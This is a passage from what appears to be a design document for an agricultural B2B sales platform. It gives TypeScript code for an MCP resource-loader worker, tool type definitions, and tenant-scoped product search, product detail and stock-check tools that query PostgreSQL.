        SELECT id FROM catalogs
        WHERE tenant_id = $1 AND is_active = true
        ORDER BY created_at DESC
        LIMIT 1
      `, [tenantId]);
      
      if (fallback.rows.length === 0) {
        throw new Error('No active catalog found');
      }
      
      return this.loadById(tenantId, fallback.rows[0].id, options);
    }
    
    return this.loadById(tenantId, result.rows[0].id, options);
  }
  
  /**
   * Search catalogs for resource discovery
   */
  async searchCatalogs(
    tenantId: string,
    options: { type?: string; isActive?: boolean; limit?: number } = {}
  ): Promise<MCPResourceMetadata[]> {
    const params: any[] = [tenantId];
    const conditions: string[] = ['tenant_id = $1'];
    
    if (options.type) {
      params.push(options.type);
      conditions.push(`type = $${params.length}`);
    }
    
    if (options.isActive !== undefined) {
      params.push(options.isActive);
      conditions.push(`is_active = $${params.length}`);
    }
    
    params.push(options.limit || 10);
    
    const result = await pool.query(`
      SELECT 
        id, name, description, type, is_active, updated_at,
        (SELECT COUNT(*) FROM products WHERE catalog_id = catalogs.id AND is_active = true) as product_count
      FROM catalogs
      WHERE ${conditions.join(' AND ')}
      ORDER BY is_default DESC, updated_at DESC
      LIMIT $${params.length}
    `, params);
    
    return result.rows.map(row => ({
      uri: `cerniq://catalogs/${row.id}`,
      resourceType: this.resourceType,
      name: row.name,
      description: row.description || `${row.type} catalog`,
      mimeType: 'application/json',
      size: 0,
      tokenEstimate: 300 + (parseInt(row.product_count) * 10), // Estimate
      lastModified: row.updated_at,
      version: '1.0',
      tags: [row.type, row.is_active ? 'active' : 'inactive'],
      language: 'ro',
      permissions: ['read'],
      tenantId,
      additionalMetadata: {
        type: row.type,
        isActive: row.is_active,
        productCount: parseInt(row.product_count)
      }
    }));
  }
  
  /**
   * Invalidate cache for catalog
   */
  async invalidateCache(tenantId: string, catalogId: string): Promise<void> {
    const cacheKey = `mcp:catalog:${tenantId}:${catalogId}`;
    await redisClient.del(cacheKey);
    logger.debug('Catalog cache invalidated', { tenantId, catalogId });
  }
}
```

### 2.6 Resource Loader Worker Implementation

```typescript
// src/workers/mcp/l1-resource-loader.worker.ts

import { Worker, Job, Queue } from 'bullmq';
import { redisConnection } from '@cerniq/redis';
import { logger } from '@cerniq/logger';
import { metrics } from '@cerniq/metrics';
import { ProductResourceHandler } from './resources/product-resource-handler';
import { ClientResourceHandler } from './resources/client-resource-handler';
import { ConversationResourceHandler } from './resources/conversation-resource-handler';
import { CatalogResourceHandler } from './resources/catalog-resource-handler';
import { MCPResourceLoadResult, MCPResourceMetadata } from './types';

// Job input interface
interface ResourceLoadJobData {
  tenantId: string;
  uri: string;
  options?: {
    maxTokens?: number;
    includeMetadata?: boolean;
    cacheTtl?: number;
    [key: string]: any;
  };
  requestId?: string;
  sessionId?: string;
}

// Job result interface
interface ResourceLoadJobResult extends MCPResourceLoadResult {
  loadTime: number;
  cached: boolean;
}

// Queue configuration
const QUEUE_NAME = 'mcp:resource:load';
const QUEUE_CONFIG = {
  defaultJobOptions: {
    attempts: 3,
    backoff: {
      type: 'exponential' as const,
      delay: 1000
    },
    removeOnComplete: {
      count: 1000,
      age: 3600
    },
    removeOnFail: {
      count: 500,
      age: 86400
    }
  }
};

// Worker configuration
const WORKER_CONFIG = {
  concurrency: 50,
  limiter: {
    max: 500,
    duration: 1000
  },
  lockDuration: 30000,
  stalledInterval: 30000
};

export class ResourceLoaderWorker {
  private worker: Worker<ResourceLoadJobData, ResourceLoadJobResult>;
  private queue: Queue<ResourceLoadJobData, ResourceLoadJobResult>;
  
  // Resource handlers
  private productHandler: ProductResourceHandler;
  private clientHandler: ClientResourceHandler;
  private conversationHandler: ConversationResourceHandler;
  private catalogHandler: CatalogResourceHandler;
  
  constructor() {
    this.productHandler = new ProductResourceHandler();
    this.clientHandler = new ClientResourceHandler();
    this.conversationHandler = new ConversationResourceHandler();
    this.catalogHandler = new CatalogResourceHandler();
    
    this.queue = new Queue(QUEUE_NAME, {
      connection: redisConnection,
      ...QUEUE_CONFIG
    });
    
    this.worker = new Worker(
      QUEUE_NAME,
      this.processJob.bind(this),
      {
        connection: redisConnection,
        ...WORKER_CONFIG
      }
    );
    
    this.setupEventHandlers();
  }
  
  /**
   * Process resource load job
   */
  private async processJob(
    job: Job<ResourceLoadJobData, ResourceLoadJobResult>
  ): Promise<ResourceLoadJobResult> {
    const startTime = Date.now();
    const { tenantId, uri, options = {} } = job.data;
    
    logger.info('Processing resource load', {
      jobId: job.id,
      uri,
      tenantId,
      requestId: job.data.requestId
    });
    
    const timer = metrics.histogram('mcp_resource_load_duration_seconds').startTimer();
    
    try {
      // Parse URI to determine resource type and ID
      const { resourceType, resourceId, subPath } = this.parseUri(uri);
      
      // Load resource based on type
      let content: any;
      let metadata: MCPResourceMetadata;
      let cached = false;
      
      switch (resourceType) {
        case 'products':
          if (subPath === 'search') {
            const searchResults = await this.productHandler.searchProducts(
              tenantId,
              options.query || '',
              options
            );
            content = searchResults;
            metadata = {
              uri,
              resourceType: 'product',
              name: `Product search: ${options.query}`,
              description: `${searchResults.length} products found`,
              mimeType: 'application/json',
              size: JSON.stringify(searchResults).length,
              tokenEstimate: Math.ceil(JSON.stringify(searchResults).length / 4),
              lastModified: new Date(),
              version: '1.0',
              tags: ['search'],
              language: 'ro',
              permissions: ['read'],
              tenantId
            };
          } else if (resourceId) {
            const result = await this.productHandler.loadById(tenantId, resourceId, options);
            content = result.content;
            metadata = result.metadata;
          } else {
            throw new Error('Product ID required for product resource');
          }
          break;
          
        case 'clients':
          if (subPath === 'search') {
            const searchResults = await this.clientHandler.searchClients(
              tenantId,
              options.query || '',
              options
            );
            content = searchResults;
            metadata = {
              uri,
              resourceType: 'client',
              name: `Client search: ${options.query}`,
              description: `${searchResults.length} clients found`,
              mimeType: 'application/json',
              size: JSON.stringify(searchResults).length,
              tokenEstimate: Math.ceil(JSON.stringify(searchResults).length / 4),
              lastModified: new Date(),
              version: '1.0',
              tags: ['search'],
              language: 'ro',
              permissions: ['read'],
              tenantId
            };
          } else if (resourceId) {
            const result = await this.clientHandler.loadById(tenantId, resourceId, options);
            content = result.content;
            metadata = result.metadata;
          } else if (options.cui) {
            const result = await this.clientHandler.loadByCUI(tenantId, options.cui, options);
            content = result.content;
            metadata = result.metadata;
          } else {
            throw new Error('Client ID or CUI required for client resource');
          }
          break;
          
        case 'conversations':
          if (subPath === 'search') {
            const searchResults = await this.conversationHandler.searchConversations(
              tenantId,
              options
            );
            content = searchResults;
            metadata = {
              uri,
              resourceType: 'conversation',
              name: 'Conversation search results',
              description: `${searchResults.length} conversations found`,
              mimeType: 'application/json',
              size: JSON.stringify(searchResults).length,
              tokenEstimate: Math.ceil(JSON.stringify(searchResults).length / 4),
              lastModified: new Date(),
              version: '1.0',
              tags: ['search'],
              language: 'ro',
              permissions: ['read'],
              tenantId
            };
          } else if (subPath === 'active' && options.customerId) {
            const result = await this.conversationHandler.loadActiveForCustomer(
              tenantId,
              options.customerId,
              options
            );
            if (!result) {
              throw new Error('No active conversation found for customer');
            }
            content = result.content;
            metadata = result.metadata;
          } else if (resourceId) {
            const result = await this.conversationHandler.loadById(tenantId, resourceId, options);
            content = result.content;
            metadata = result.metadata;
          } else {
            throw new Error('Conversation ID required for conversation resource');
          }
          break;
          
        case 'catalogs':
          if (subPath === 'default') {
            const result = await this.catalogHandler.loadDefault(tenantId, options);
            content = result.content;
            metadata = result.metadata;
          } else if (resourceId) {
            const result = await this.catalogHandler.loadById(tenantId, resourceId, options);
            content = result.content;
            metadata = result.metadata;
          } else {
            // Search catalogs
            const searchResults = await this.catalogHandler.searchCatalogs(tenantId, options);
            content = searchResults;
            metadata = {
              uri,
              resourceType: 'catalog',
              name: 'Catalog list',
              description: `${searchResults.length} catalogs found`,
              mimeType: 'application/json',
              size: JSON.stringify(searchResults).length,
              tokenEstimate: Math.ceil(JSON.stringify(searchResults).length / 4),
              lastModified: new Date(),
              version: '1.0',
              tags: ['list'],
              language: 'ro',
              permissions: ['read'],
              tenantId
            };
          }
          break;
          
        default:
          throw new Error(`Unknown resource type: ${resourceType}`);
      }
      
      // Calculate tokens
      const contentStr = JSON.stringify(content);
      const tokens = Math.ceil(contentStr.length / 4);
      
      // Update progress
      await job.updateProgress(100);
      
      const loadTime = Date.now() - startTime;
      
      // Record metrics
      timer({ resource_type: resourceType, status: 'success' });
      metrics.counter('mcp_resources_loaded_total').inc({ resource_type: resourceType });
      
      logger.info('Resource loaded successfully', {
        jobId: job.id,
        uri,
        resourceType,
        tokens,
        loadTime
      });
      
      return {
        uri,
        resourceType: resourceType as any,
        content,
        tokens,
        metadata: options.includeMetadata ? metadata : undefined,
        loadTime,
        cached
      };
      
    } catch (error) {
      timer({ resource_type: 'unknown', status: 'error' });
      metrics.counter('mcp_resource_load_errors_total').inc();
      
      logger.error('Resource load failed', {
        jobId: job.id,
        uri,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      
      throw error;
    }
  }
  
  /**
   * Parse MCP URI
   */
  private parseUri(uri: string): {
    resourceType: string;
    resourceId: string | null;
    subPath: string | null;
  } {
    // URI format: cerniq://[resourceType]/[resourceId]?[subPath]
    // Examples:
    //   cerniq://products/abc123
    //   cerniq://clients/search
    //   cerniq://conversations/xyz789
    //   cerniq://catalogs/default
    
    const match = uri.match(/^cerniq:\/\/(\w+)(?:\/([^\/\?]+))?(?:\/([^\/\?]+))?/);
    
    if (!match) {
      throw new Error(`Invalid MCP URI format: ${uri}`);
    }
    
    return {
      resourceType: match[1],
      resourceId: match[2] && match[2] !== 'search' && match[2] !== 'default' ? match[2] : null,
      subPath: match[3] || (match[2] === 'search' || match[2] === 'default' ? match[2] : null)
    };
  }
  
  /**
   * Setup event handlers
   */
  private setupEventHandlers(): void {
    this.worker.on('completed', (job, result) => {
      logger.debug('Resource load job completed', {
        jobId: job.id,
        uri: job.data.uri,
        tokens: result.tokens
      });
    });
    
    this.worker.on('failed', (job, error) => {
      logger.error('Resource load job failed', {
        jobId: job?.id,
        uri: job?.data.uri,
        error: error.message
      });
    });
    
    this.worker.on('error', (error) => {
      logger.error('Worker error', { error: error.message });
    });
    
    this.worker.on('stalled', (jobId) => {
      logger.warn('Job stalled', { jobId });
    });
  }
  
  /**
   * Add job to queue
   */
  async addJob(
    data: ResourceLoadJobData,
    options?: { priority?: number; delay?: number }
  ): Promise<Job<ResourceLoadJobData, ResourceLoadJobResult>> {
    return this.queue.add('load-resource', data, {
      priority: options?.priority || 2,
      delay: options?.delay
    });
  }
  
  /**
   * Get queue metrics
   */
  async getMetrics(): Promise<{
    waiting: number;
    active: number;
    completed: number;
    failed: number;
    delayed: number;
  }> {
    const [waiting, active, completed, failed, delayed] = await Promise.all([
      this.queue.getWaitingCount(),
      this.queue.getActiveCount(),
      this.queue.getCompletedCount(),
      this.queue.getFailedCount(),
      this.queue.getDelayedCount()
    ]);
    
    return { waiting, active, completed, failed, delayed };
  }
  
  /**
   * Graceful shutdown
   */
  async shutdown(): Promise<void> {
    logger.info('Shutting down Resource Loader Worker...');
    await this.worker.close();
    await this.queue.close();
    logger.info('Resource Loader Worker shut down');
  }
}

// Worker instance
export const resourceLoaderWorker = new ResourceLoaderWorker();
```

---

## 3. Worker L2: Tool Registry

### 3.1 Overview

Worker L2 manages the MCP Tool Registry, enabling dynamic registration, discovery, and invocation of tools available to the LLM. This worker implements the Model Context Protocol tool specification with support for custom agricultural and B2B sales tools.

```
┌────────────────────────────────────────────────────────────────────────┐
│                      MCP TOOL REGISTRY                                  │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│  │   Built-in  │    │   Custom    │    │  External   │                │
│  │    Tools    │    │   Tools     │    │   Tools     │                │
│  └──────┬──────┘    └──────┬──────┘    └──────┬──────┘                │
│         │                  │                  │                        │
│         └──────────────────┼──────────────────┘                        │
│                            ▼                                           │
│              ┌──────────────────────────┐                             │
│              │     Tool Registry        │                             │
│              │   ┌──────────────────┐   │                             │
│              │   │  Registration    │   │                             │
│              │   │  Validation      │   │                             │
│              │   │  Schema Check    │   │                             │
│              │   └──────────────────┘   │                             │
│              └──────────────────────────┘                             │
│                            │                                           │
│         ┌──────────────────┼──────────────────┐                       │
│         ▼                  ▼                  ▼                        │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                │
│  │   Product   │    │   Sales     │    │  Inventory  │                │
│  │    Tools    │    │   Tools     │    │   Tools     │                │
│  └─────────────┘    └─────────────┘    └─────────────┘                │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

| Attribute | Value |
|-----------|-------|
| **Queue Name** | `mcp:tool:register` |
| **Concurrency** | 10 |
| **Rate Limit** | 50/s |
| **Timeout** | 30000ms |
| **Retries** | 3 |

### 3.2 Tool Definition Interface

```typescript
// src/workers/mcp/tools/types.ts

import { z } from 'zod';

/**
 * MCP Tool definition following Model Context Protocol specification
 */
export interface MCPTool {
  // Identity
  name: string;
  displayName: string;
  displayNameRo?: string;
  description: string;
  descriptionRo?: string;
  version: string;
  
  // Categorization
  category: ToolCategory;
  tags: string[];
  
  // Schema
  inputSchema: z.ZodObject<any>;
  outputSchema: z.ZodObject<any>;
  
  // Execution
  handler: ToolHandler;
  
  // Configuration
  config: ToolConfig;
  
  // Metadata
  metadata: ToolMetadata;
}

export type ToolCategory = 
  | 'product'      // Product information tools
  | 'inventory'    // Stock and availability tools
  | 'pricing'      // Price and discount tools
  | 'order'        // Order management tools
  | 'client'       // Customer management tools
  | 'communication'// Communication tools
  | 'document'     // Document generation tools
  | 'fiscal'       // Fiscal/invoice tools
  | 'analytics'    // Analysis tools
  | 'agricultural' // Agriculture-specific tools
  | 'utility';     // General utility tools

export interface ToolConfig {
  // Execution limits
  timeout: number;           // ms
  maxRetries: number;
  rateLimit?: {
    max: number;
    windowMs: number;
  };
  
  // Permissions
  requiredPermissions: string[];
  tenantScoped: boolean;
  
  // Caching
  cacheable: boolean;
  cacheTtl?: number;         // seconds
  cacheKeyFn?: (input: any) => string;
  
  // Safety
  requiresConfirmation: boolean;
  isMutating: boolean;
  sensitiveFields?: string[];
  
  // Cost
  tokenCost?: number;        // Estimated tokens used
  creditCost?: number;       // Credits charged per call
}

export interface ToolMetadata {
  author: string;
  createdAt: Date;
  updatedAt: Date;
  enabled: boolean;
  deprecated: boolean;
  deprecationMessage?: string;
  
  // Usage stats
  callCount: number;
  successRate: number;
  avgLatency: number;
  
  // Documentation
  examples: ToolExample[];
  relatedTools: string[];
}

export interface ToolExample {
  name: string;
  description: string;
  input: any;
  output: any;
}

export type ToolHandler = (
  input: any,
  context: ToolExecutionContext
) => Promise<ToolResult>;

export interface ToolExecutionContext {
  tenantId: string;
  userId?: string;
  sessionId: string;
  conversationId?: string;
  requestId: string;
  
  // Services
  db: any;
  redis: any;
  logger: any;
  
  // Permissions
  permissions: string[];
  
  // Metadata
  locale: string;
  timezone: string;
}

export interface ToolResult<T = any> {
  success: boolean;
  data?: T;
  error?: {
    code: string;
    message: string;
    details?: any;
  };
  metadata?: {
    executionTime: number;
    cached: boolean;
    tokensUsed?: number;
  };
}

/**
 * Tool invocation request
 */
export interface ToolInvocationRequest {
  tenantId: string;
  tool: string;
  input: any;
  context: Partial<ToolExecutionContext>;
}

/**
 * Tool invocation result
 */
export interface ToolInvocationResult {
  tool: string;
  result: ToolResult;
  invocationId: string;
  timestamp: Date;
}
```

### 3.3 Built-in Product Tools

```typescript
// src/workers/mcp/tools/product-tools.ts

import { z } from 'zod';
import { MCPTool, ToolCategory, ToolResult } from './types';
import { pool } from '@cerniq/database';

/**
 * Tool: search_products
 * Search product catalog with various filters
 */
export const searchProductsTool: MCPTool = {
  name: 'search_products',
  displayName: 'Search Products',
  displayNameRo: 'Căutare Produse',
  description: 'Search the product catalog by name, SKU, category, or attributes',
  descriptionRo: 'Caută în catalogul de produse după nume, SKU, categorie sau atribute',
  version: '1.0.0',
  category: 'product',
  tags: ['search', 'catalog', 'products'],
  
  inputSchema: z.object({
    query: z.string().optional().describe('Search query text'),
    sku: z.string().optional().describe('Product SKU'),
    category: z.string().optional().describe('Product category'),
    minPrice: z.number().optional().describe('Minimum price'),
    maxPrice: z.number().optional().describe('Maximum price'),
    inStock: z.boolean().optional().describe('Filter for in-stock items only'),
    cropTypes: z.array(z.string()).optional().describe('Filter by applicable crop types'),
    limit: z.number().min(1).max(50).default(10).describe('Maximum results to return')
  }),
  
  outputSchema: z.object({
    products: z.array(z.object({
      id: z.string(),
      sku: z.string(),
      name: z.string(),
      nameRo: z.string().optional(),
      description: z.string().optional(),
      price: z.number(),
      currency: z.string(),
      inStock: z.boolean(),
      stockQuantity: z.number(),
      category: z.string().optional(),
      imageUrl: z.string().optional()
    })),
    totalCount: z.number(),
    hasMore: z.boolean()
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { query, sku, category, minPrice, maxPrice, inStock, cropTypes, limit } = input;
    
    try {
      const params: any[] = [tenantId];
      const conditions: string[] = ['p.tenant_id = $1', 'p.is_active = true'];
      
      if (query) {
        params.push(`%${query}%`);
        conditions.push(`(p.name ILIKE $${params.length} OR p.name_ro ILIKE $${params.length} OR p.description ILIKE $${params.length})`);
      }
      
      if (sku) {
        params.push(sku);
        conditions.push(`p.sku = $${params.length}`);
      }
      
      if (category) {
        params.push(category);
        conditions.push(`pc.name = $${params.length}`);
      }
      
      if (minPrice !== undefined) {
        params.push(minPrice);
        conditions.push(`p.base_price >= $${params.length}`);
      }
      
      if (maxPrice !== undefined) {
        params.push(maxPrice);
        conditions.push(`p.base_price <= $${params.length}`);
      }
      
      if (inStock === true) {
        conditions.push('p.stock_quantity > 0');
      }
      
      if (cropTypes && cropTypes.length > 0) {
        params.push(cropTypes);
        conditions.push(`p.crop_types && $${params.length}`);
      }
      
      params.push(limit + 1); // +1 to check if there are more
      
      const result = await db.query(`
        SELECT 
          p.id, p.sku, p.name, p.name_ro, p.description, 
          p.base_price as price, p.currency,
          p.stock_quantity > 0 as in_stock,
          p.stock_quantity,
          pc.name as category,
          pi.url as image_url
        FROM products p
        LEFT JOIN product_categories pc ON pc.id = p.category_id
        LEFT JOIN product_images pi ON pi.product_id = p.id AND pi.is_primary = true
        WHERE ${conditions.join(' AND ')}
        ORDER BY p.popularity_score DESC, p.name
        LIMIT $${params.length}
      `, params);
      
      const hasMore = result.rows.length > limit;
      const products = result.rows.slice(0, limit).map(row => ({
        id: row.id,
        sku: row.sku,
        name: row.name,
        nameRo: row.name_ro,
        description: row.description,
        price: parseFloat(row.price),
        currency: row.currency || 'RON',
        inStock: row.in_stock,
        stockQuantity: parseInt(row.stock_quantity),
        category: row.category,
        imageUrl: row.image_url
      }));
      
      // Get total count
      const countResult = await db.query(`
        SELECT COUNT(*) 
        FROM products p
        LEFT JOIN product_categories pc ON pc.id = p.category_id
        WHERE ${conditions.slice(0, -1).join(' AND ')}
      `, params.slice(0, -1));
      
      return {
        success: true,
        data: {
          products,
          totalCount: parseInt(countResult.rows[0].count),
          hasMore
        }
      };
      
    } catch (error) {
      logger.error('search_products error', { error });
      return {
        success: false,
        error: {
          code: 'SEARCH_ERROR',
          message: error instanceof Error ? error.message : 'Search failed'
        }
      };
    }
  },
  
  config: {
    timeout: 10000,
    maxRetries: 2,
    rateLimit: { max: 100, windowMs: 60000 },
    requiredPermissions: ['products:read'],
    tenantScoped: true,
    cacheable: true,
    cacheTtl: 60,
    cacheKeyFn: (input) => JSON.stringify(input),
    requiresConfirmation: false,
    isMutating: false
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [
      {
        name: 'Search by text',
        description: 'Search for fertilizers',
        input: { query: 'îngrășământ', limit: 5 },
        output: { products: [/* ... */], totalCount: 15, hasMore: true }
      },
      {
        name: 'Search by category and price',
        description: 'Find pesticides under 500 RON',
        input: { category: 'Pesticide', maxPrice: 500, inStock: true },
        output: { products: [/* ... */], totalCount: 8, hasMore: false }
      }
    ],
    relatedTools: ['get_product_details', 'check_stock', 'get_product_price']
  }
};

/**
 * Tool: get_product_details
 * Get detailed information about a specific product
 */
export const getProductDetailsTool: MCPTool = {
  name: 'get_product_details',
  displayName: 'Get Product Details',
  displayNameRo: 'Detalii Produs',
  description: 'Get comprehensive details about a specific product by ID or SKU',
  descriptionRo: 'Obține detalii complete despre un produs specific după ID sau SKU',
  version: '1.0.0',
  category: 'product',
  tags: ['product', 'details', 'info'],
  
  inputSchema: z.object({
    productId: z.string().optional().describe('Product UUID'),
    sku: z.string().optional().describe('Product SKU'),
    includeStock: z.boolean().default(true).describe('Include stock information'),
    includePricing: z.boolean().default(true).describe('Include pricing details'),
    includeSpecifications: z.boolean().default(true).describe('Include technical specifications')
  }).refine(data => data.productId || data.sku, {
    message: 'Either productId or sku must be provided'
  }),
  
  outputSchema: z.object({
    product: z.object({
      id: z.string(),
      sku: z.string(),
      name: z.string(),
      nameRo: z.string().optional(),
      description: z.string().optional(),
      descriptionRo: z.string().optional(),
      category: z.string().optional(),
      subcategory: z.string().optional(),
      brand: z.string().optional(),
      manufacturer: z.string().optional(),
      pricing: z.object({
        basePrice: z.number(),
        currency: z.string(),
        vatRate: z.number(),
        priceWithVat: z.number(),
        discounts: z.array(z.object({
          type: z.string(),
          value: z.number(),
          description: z.string().optional()
        })).optional()
      }).optional(),
      stock: z.object({
        available: z.number(),
        reserved: z.number(),
        incoming: z.number(),
        incomingDate: z.string().optional(),
        location: z.string().optional(),
        status: z.enum(['in_stock', 'low_stock', 'out_of_stock', 'discontinued'])
      }).optional(),
      specifications: z.array(z.object({
        name: z.string(),
        value: z.string(),
        unit: z.string().optional()
      })).optional(),
      agricultural: z.object({
        cropTypes: z.array(z.string()).optional(),
        applicationMethod: z.string().optional(),
        dosage: z.string().optional(),
        activeIngredients: z.array(z.string()).optional(),
        safetyPeriod: z.string().optional(),
        seasonality: z.string().optional()
      }).optional(),
      images: z.array(z.string()).optional(),
      documents: z.array(z.object({
        type: z.string(),
        name: z.string(),
        url: z.string()
      })).optional()
    })
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { productId, sku, includeStock, includePricing, includeSpecifications } = input;
    
    try {
      // Build query
      let whereClause: string;
      let params: any[];
      
      if (productId) {
        whereClause = 'p.id = $1 AND p.tenant_id = $2';
        params = [productId, tenantId];
      } else {
        whereClause = 'p.sku = $1 AND p.tenant_id = $2';
        params = [sku, tenantId];
      }
      
      const result = await db.query(`
        SELECT 
          p.*,
          pc.name as category_name,
          pc2.name as subcategory_name,
          pb.name as brand_name,
          pm.name as manufacturer_name
        FROM products p
        LEFT JOIN product_categories pc ON pc.id = p.category_id
        LEFT JOIN product_categories pc2 ON pc2.id = p.subcategory_id
        LEFT JOIN product_brands pb ON pb.id = p.brand_id
        LEFT JOIN product_manufacturers pm ON pm.id = p.manufacturer_id
        WHERE ${whereClause}
      `, params);
      
      if (result.rows.length === 0) {
        return {
          success: false,
          error: {
            code: 'PRODUCT_NOT_FOUND',
            message: `Product not found: ${productId || sku}`
          }
        };
      }
      
      const row = result.rows[0];
      
      // Build product object
      const product: any = {
        id: row.id,
        sku: row.sku,
        name: row.name,
        nameRo: row.name_ro,
        description: row.description,
        descriptionRo: row.description_ro,
        category: row.category_name,
        subcategory: row.subcategory_name,
        brand: row.brand_name,
        manufacturer: row.manufacturer_name
      };
      
      // Add pricing
      if (includePricing) {
        const vatRate = parseFloat(row.vat_rate) || 0.19;
        const basePrice = parseFloat(row.base_price);
        
        product.pricing = {
          basePrice,
          currency: row.currency || 'RON',
          vatRate: vatRate * 100,
          priceWithVat: basePrice * (1 + vatRate)
        };
        
        // Get active discounts
        const discountsResult = await db.query(`
          SELECT type, discount_value, description
          FROM product_discounts
          WHERE product_id = $1 
            AND is_active = true 
            AND (valid_from IS NULL OR valid_from <= NOW())
            AND (valid_until IS NULL OR valid_until >= NOW())
        `, [row.id]);
        
        if (discountsResult.rows.length > 0) {
          product.pricing.discounts = discountsResult.rows.map(d => ({
            type: d.type,
            value: parseFloat(d.discount_value),
            description: d.description
          }));
        }
      }
      
      // Add stock
      if (includeStock) {
        const stockResult = await db.query(`
          SELECT 
            available_quantity,
            reserved_quantity,
            incoming_quantity,
            incoming_date,
            warehouse_location
          FROM product_stock
          WHERE product_id = $1 AND tenant_id = $2
        `, [row.id, tenantId]);
        
        if (stockResult.rows.length > 0) {
          const stockRow = stockResult.rows[0];
          const available = parseInt(stockRow.available_quantity) || 0;
          
          let status: 'in_stock' | 'low_stock' | 'out_of_stock' | 'discontinued';
          if (!row.is_active) status = 'discontinued';
          else if (available === 0) status = 'out_of_stock';
          else if (available < 10) status = 'low_stock';
          else status = 'in_stock';
          
          product.stock = {
            available,
            reserved: parseInt(stockRow.reserved_quantity) || 0,
            incoming: parseInt(stockRow.incoming_quantity) || 0,
            incomingDate: stockRow.incoming_date?.toISOString(),
            location: stockRow.warehouse_location,
            status
          };
        }
      }
      
      // Add specifications
      if (includeSpecifications) {
        const specsResult = await db.query(`
          SELECT name, value, unit
          FROM product_specifications
          WHERE product_id = $1
          ORDER BY display_order
        `, [row.id]);
        
        product.specifications = specsResult.rows.map(s => ({
          name: s.name,
          value: s.value,
          unit: s.unit
        }));
      }
      
      // Add agricultural info
      if (row.crop_types || row.application_method || row.dosage) {
        product.agricultural = {
          cropTypes: row.crop_types,
          applicationMethod: row.application_method,
          dosage: row.dosage,
          activeIngredients: row.active_ingredients,
          safetyPeriod: row.safety_period,
          seasonality: row.seasonality
        };
      }
      
      // Get images
      const imagesResult = await db.query(`
        SELECT url FROM product_images
        WHERE product_id = $1
        ORDER BY is_primary DESC, display_order
      `, [row.id]);
      
      if (imagesResult.rows.length > 0) {
        product.images = imagesResult.rows.map(i => i.url);
      }
      
      // Get documents
      const docsResult = await db.query(`
        SELECT type, name, url FROM product_documents
        WHERE product_id = $1
        ORDER BY type, name
      `, [row.id]);
      
      if (docsResult.rows.length > 0) {
        product.documents = docsResult.rows;
      }
      
      return {
        success: true,
        data: { product }
      };
      
    } catch (error) {
      logger.error('get_product_details error', { error });
      return {
        success: false,
        error: {
          code: 'FETCH_ERROR',
          message: error instanceof Error ? error.message : 'Failed to fetch product details'
        }
      };
    }
  },
  
  config: {
    timeout: 10000,
    maxRetries: 2,
    requiredPermissions: ['products:read'],
    tenantScoped: true,
    cacheable: true,
    cacheTtl: 300,
    cacheKeyFn: (input) => `${input.productId || input.sku}`,
    requiresConfirmation: false,
    isMutating: false
  },
  
  metadata: {
    author: 'Cerniq Team',
    createdAt: new Date('2026-01-01'),
    updatedAt: new Date('2026-01-18'),
    enabled: true,
    deprecated: false,
    callCount: 0,
    successRate: 0,
    avgLatency: 0,
    examples: [
      {
        name: 'Get by SKU',
        description: 'Get product details by SKU',
        input: { sku: 'FERT-NPK-15-15-15', includeStock: true },
        output: { product: { /* ... */ } }
      }
    ],
    relatedTools: ['search_products', 'check_stock', 'get_product_price']
  }
};
```

### 3.4 Built-in Inventory Tools

```typescript
// src/workers/mcp/tools/inventory-tools.ts

import { z } from 'zod';
import { MCPTool, ToolResult } from './types';

/**
 * Tool: check_stock
 * Check stock availability for one or more products
 */
export const checkStockTool: MCPTool = {
  name: 'check_stock',
  displayName: 'Check Stock',
  displayNameRo: 'Verificare Stoc',
  description: 'Check real-time stock availability for products',
  descriptionRo: 'Verifică disponibilitatea stocului în timp real pentru produse',
  version: '1.0.0',
  category: 'inventory',
  tags: ['stock', 'inventory', 'availability'],
  
  inputSchema: z.object({
    products: z.array(z.object({
      productId: z.string().optional(),
      sku: z.string().optional(),
      quantity: z.number().min(1).default(1).describe('Requested quantity')
    })).min(1).max(50).describe('Products to check')
  }),
  
  outputSchema: z.object({
    results: z.array(z.object({
      productId: z.string(),
      sku: z.string(),
      productName: z.string(),
      requestedQuantity: z.number(),
      availableQuantity: z.number(),
      reservedQuantity: z.number(),
      isAvailable: z.boolean(),
      canFulfill: z.boolean(),
      shortfall: z.number().optional(),
      incomingStock: z.object({
        quantity: z.number(),
        expectedDate: z.string().optional()
      }).optional(),
      alternatives: z.array(z.object({
        productId: z.string(),
        sku: z.string(),
        name: z.string(),
        availableQuantity: z.number()
      })).optional()
    })),
    summary: z.object({
      totalProducts: z.number(),
      allAvailable: z.boolean(),
      availableCount: z.number(),
      unavailableCount: z.number()
    })
  }),
  
  handler: async (input, context) => {
    const { tenantId, db, logger } = context;
    const { products } = input;
    
    try {
      const results: any[] = [];
      
      for (const item of products) {
        // Find product
        let productQuery: string;
        let productParams: any[];
        
        if (item.productId) {
          productQuery = 'SELECT * FROM products WHERE id = $1 AND tenant_id = $2';
          productParams = [item.productId, tenantId];
        } else if (item.sku) {
          productQuery = 'SELECT * FROM products WHERE sku = $1 AND tenant_id = $2';
          productParams = [item.sku, tenantId];
        } else {
          continue; // Skip if no identifier
        }
        
        const productResult = await db.query(productQuery, productParams);
        
        if (productResult.rows.length === 0) {
          results.push({
            productId: item.productId || '',
            sku: item.sku || '',
            productName: 'Unknown',
            requestedQuantity: item.quantity,
            availableQuantity: 0,
            reservedQuantity: 0,
            isAvailable: false,
            canFulfill: false,
            shortfall: item.quantity
          });
          continue;
        }
        
        const product = productResult.rows[0];
        
        // Get stock info
        const stockResult = await db.query(`
          SELECT 
            available_quantity,
            reserved_quantity,
            incoming_quantity,
            incoming_date
          FROM product_stock
          WHERE product_id = $1 AND tenant_id = $2
        `, [product.id, tenantId]);
        
        const stock = stockResult.rows[0] || {
          available_quantity: 0,
          reserved_quantity: 0,
          incoming_quantity: 0,
          incoming_date: null
        };
        
        const available = parseInt(stock.available_quantity) || 0;
        const reserved = parseInt(stock.reserved_quantity) || 0;
